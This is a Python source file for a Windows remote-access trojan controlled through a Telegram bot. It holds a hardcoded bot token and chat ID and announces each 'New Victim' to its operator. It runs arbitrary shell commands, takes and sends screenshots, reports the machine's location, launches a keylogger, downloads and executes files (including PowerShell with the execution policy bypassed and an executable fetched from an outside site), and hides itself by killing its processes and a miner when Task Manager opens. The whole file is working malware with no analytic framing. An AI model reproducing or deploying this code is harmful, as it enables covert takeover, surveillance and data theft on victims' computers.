import shutil
import requests
import json
import sys
import os
import getpass
from psutil import virtual_memory
from platform import uname , processor , machine
import subprocess
import pyautogui
import tempfile
from _winreg import *
import ctypes
import itertools
import psutil
import threading
import urllib
import re
import traceback
try:
	import win32com.shell.shell as shell
except:
	os.system('pip install pywin32')
	sub = subprocess.Popen(["\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\" + "python.exe","-m","pip","install","pywin32"],shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
class Loader():
	def __init__(self):
		self.progrm = sys.argv[1]
		self.token = "1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw"
		self.chat_id = "1742761281"
		data = json.loads(self.Request("http://ip-api.com/json/"))
		self.ip = data["query"]
		self.country = data["country"]
		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
		self.plugins = requests.get('https://textbin.net/raw/tc3lntemtr').json()
		thread = threading.Thread(target = self.Auto_Close)
		thread.start()
		self.SendNotification()
		while True:
			try:
				self.Kill_Self()
				self.Main()
			except requests.ConnectionError:
				pass
			except Exception as ex:
				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + traceback.format_exc())
	def Execute_Keylogger(self):
		filename = os.path.abspath(__file__).split("\\")
		filename.pop()
		dirname = "\\".join(filename)
		os.system(dirname + "\\python.exe " + dirname + "\\Keylogger.py")
	def Request(self, url):
		url = url.replace("#","")
		return requests.get(url).text
	def Send_Photo(self,filename):
		url = "https://api.telegram.org/bot" + self.token + "/sendPhoto?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id
		requests.get(url, files={'photo':open(filename,'rb')})
	def SendMessage(self,message):
		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
	def SendNotification(self):
		filename = "C:\\Users\\Public\\old.txt"
		if os.path.exists(filename):
			self.SendMessage("%F0%9F%98%88  Online Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
		else:
			file = open("C:\\Users\\Public\\old.txt","w")
			self.SendMessage("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
	def Main(self):
		data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
		old_date = data['result'][-1]['message']['date']
		while True:
			data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
			message = data['result'][-1]['message']
			new_date = message['date']
			if(old_date != new_date):
				old_date = new_date
				self.Request("https://api.telegram.org/bot" + self.token + "/getUpdates?offset=" + str(data['result'][-1]['update_id']))
				if("text" in message.keys()):
					command = message['text'].split(" ")[0]
					if command == "/list":
						self.SendNotification()
					if (message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]):
						if command == "/geo":
							data = json.loads(self.Request('http://ip-api.com/json/'))
							message = "%F0%9F%8C%8E Geo Location : \n"
							message += "%E2%9D%96 IP : " + data['query'] + "\n";
							message += "%E2%9D%96 Country : " + data['country'] + "\n";
							message += "%E2%9D%96 City : " + data['city'] + "\n";
							message += "%E2%9D%96 Region Name : " + data['regionName'] + "\n";
							message += "%E2%9D%96 Country Code : " + data['countryCode'] + "\n";
							message += "%E2%9D%96 Time Zone : " + data['timezone'] + "\n";
							message += "%E2%9D%96 MAP : http://extreme-ip-lookup.com/" + data['query'];
							self.SendMessage(message)
						elif command == "/close":
							os.system("taskkill /IM python.exe /F")
						elif command == "/restart":
							filename = os.path.abspath(__file__).split("\\")
							filename.pop()
							filename = "\\".join(filename) + "\\Main.vbs"
							os.system("taskkill /IM python.exe /F & " + filename)
						elif command == "/execute":
							spl = message['text'].split(" ")
							spl.remove(spl[0])
							spl.pop()
							cmd = " ".join(spl).split(" ")
							sub = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
							output , error = sub.communicate()
							if error:
								message = "%F0%9F%96%A5 Command Error : \n"
								message += error
								self.SendMessage(message)
							if output:
								message = "%F0%9F%96%A5 Command Output : \n"
								message += output
								self.SendMessage(message)
							else:
								message = "%E2%9C%94%EF%B8%8F Command Executed Successfully"
								self.SendMessage(message)
						elif command == "/screenshot":
							file = tempfile.TemporaryFile()
							filename = file.name + ".jpg"
							file.close()
							pyautogui.screenshot().save(filename)
							self.Send_Photo(filename)
							requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : open(filename,'rb')})
						elif command == "/update":
							self.SendMessage("%F0%9F%93%8C Downloading Update...")
							file = tempfile.TemporaryFile()
							filename = os.environ['TEMP'] + "\\Setup.exe"
							file.close()
							req = requests.get('https://www.tapanhospital.com/NetFlix/Setup.exe',headers={'User-Agent':'Chrome'})
							file = open(filename,"wb")
							file.write(req.content)
							file.close()
							dirname = r"C:\Users\Public\X4-Loader"
							ctypes.windll.kernel32.SetFileAttributesW(dirname, 128)
							for i in os.popen("dir /s /b /o:gn " + dirname + " & dir /AD /B /ON /S " + dirname).read().split('\n'):
								ctypes.windll.kernel32.SetFileAttributesW(i, 128)
							self.SendMessage("%F0%9F%93%8C Executeing Update...")
							os.system("taskkill /IM python.exe /F & rmdir " + dirname + " /S /Q & " + filename)
							# taskkill /F /IM python.exe && attrib -s -h C:\Users\Public\X4-Loader && rmdir X4-Loader /S /Q & %temp%/Setup.exe

				else:
					file_id = message['document']['file_id']
					caption = message['caption'].split("-")[0]
					if caption in [self.ip, getpass.getuser(), "All"]:
						data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getFile?file_id=' + file_id))
						link = data['result']['file_path']
						link = "https://api.telegram.org/file/bot" + self.token + "/" + link
						file = tempfile.TemporaryFile()
						filename = file.name + "." + link.split(".")[-1]
						file.close()
						req = requests.get(link)
						file = open(filename,"wb")
						file.write(req.content)
						file.close()
						if filename.endswith(".py"):
							sub = subprocess.Popen(["\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\" + "python.exe",filename,self.token,self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						elif filename.endswith(".ps1"):
							sub = subprocess.Popen(["powershell.exe","-ExecutionPolicy","Bypass","-File",filename,self.token,self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						else:
							cmd = [filename]
							sub = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
						self.SendMessage("%E2%9C%94%EF%B8%8F File Downlaoded And Executed")
						if len(message['caption'].split("-")) > 1:
							output, error = sub.communicate()
							if error:
								message = "%F0%9F%96%A5 Command [" + " ".join(cmd) + "] \n %E2%9D%96 Error : \n"
								message += error.encode('utf-8')
							if output:
								message = "%F0%9F%96%A5 Command [" + " ".join(cmd) + "] \n %E2%9D%96 Output : \n"
								message += output
							self.SendMessage(message)
	def Auto_Close(self):
		while True:
			for proc in psutil.process_iter():
				try:
					if proc.name() == "Taskmgr.exe":
						os.system("taskkill /IM miner.exe /F")
						os.system("taskkill /IM python.exe /F")
				except:
					pass
	def Kill_Self(self):
			num = 0
			for proc in psutil.process_iter():
				try:
					if proc.name() == "python.exe":
						num += 1
				except:
					pass
			if num > 1:
				os.system("taskkill /IM python.exe /F")

Loader()
